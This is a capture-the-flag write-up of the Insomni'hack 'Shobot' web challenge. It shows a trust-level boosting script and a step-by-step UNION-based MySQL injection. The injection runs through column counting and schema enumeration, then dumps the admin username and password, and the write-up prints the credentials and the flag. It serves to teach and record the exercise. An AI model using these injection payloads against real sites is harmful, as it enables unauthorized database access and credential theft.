# Insomni'hack teaser - Shobot (web 200)
You were presented with an online store that sold robots. We didn't manage to solve this challenge in time.

### What we did correct
The website had a function running that calculates a user's trust level based on how many products he/she buys. If you tried any SQL injection in the URL parameters with low trust level, the server would detect it and lower your trust level. Once you reached the maximum trust level, you could successfully execute SQL injections.

### What we missed
We did not experiment with how far the trust level went, had we done that we would have reached 160 and our SQL injection would have gone through.

### What we did wrong
```python
import requests,time
s = requests.Session()
cookie= dict(PHPSESSID= 'f5hnhjd5qbiiebu9v057fe6m51')
while True:
    time.sleep(0.5)
    r = s.get('http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart', cookies=cookie)
    r = s.get('http://shobot.teaser.insomnihack.ch/?page=cartconfirm', cookies=cookie)
```

Once we had the above script running, boosting the trust level to 160, we could do SQL injection in one of the parameters.
We noticed that this worked, to verify there was an SQLi:

**ERROR**: `http://shobot.teaser.insomnihack.ch/?page=article&artid=2' and '1'='2`

**SUCCESS**: `http://shobot.teaser.insomnihack.ch/?page=article&artid=2' and '1'='1`
 
So next step would be to figure out how many columns there are by running the classic:
 
`2' order by 1 --`
 
But that didn't work, because the comment had to be url_encoded. The double dash comment (--) was also incorrect. In order for the query to work you would have to url_encode the # for comment.
What we should have done
The working query looks like this:
 
`http://shobot.teaser.insomnihack.ch/?page=article&artid=2' order by 5 %23`
 
By doing `2' order by N %23` you can find the number of columns in the query, this is necessary because the UNION operator can only be used if both queries have the same structure. Therefore the attacker needs to create a SELECT statement similar to the original query.

If you keep increasing `N` until you reach 6, the page will disappear, meaning the column count is 5. Now we know there are 5 columns and can continue like this (you do this directly to figure out the number of columns):
 
`http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,2,3,4,5 %23`
 
Notice the `-2`, in order for this to work you have to select a non existent id, putting a minus (-) sign usually get the job done. The numbers that shows on the page are the columns that you can interact with. The numbers 2, 3 and 5 showed, so we can do this:
 
`http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,@@version,3,4,5 %23`
 
Should show the mysql version. Now lets retrieve the tables so we know that we are working with:
 
`http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,group_concat(table_name),3,4,5 FROM information_schema.tables where table_schema=database() %23`
 
We are selecting from `information_schema.tables` which contains information about all the tables. Then we make sure the `table_schema` is set to the current database, meaning want tables for the current database. We have two tables, the result is: `article, shbt_user`. Now we can retrieve the column names from the shbt_user table:
 
`http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,group_concat(column_name),3,4,5 FROM information_schema.columns where table_schema=database() %23`
 
Result: `id,name,description,img_link,price,shbt_userid,shbt_username,shbt_userpassword`. Let's get the values for `shbt_username, shbt_userpassword` by running the following query:
 
`http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,concat(shbt_username,0x3a,shbt_userpassword),3,4,5 FROM shbt_user %23`
 
The result is: `sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry`. Now we can login to the admin site and collect the **flag**: `INS{##r0b0tss!4v3ry1s!4m3}`

## What have we learned?
- Always try all the possible comment signs for mysql and always try to encode.
- Always experiment with values.

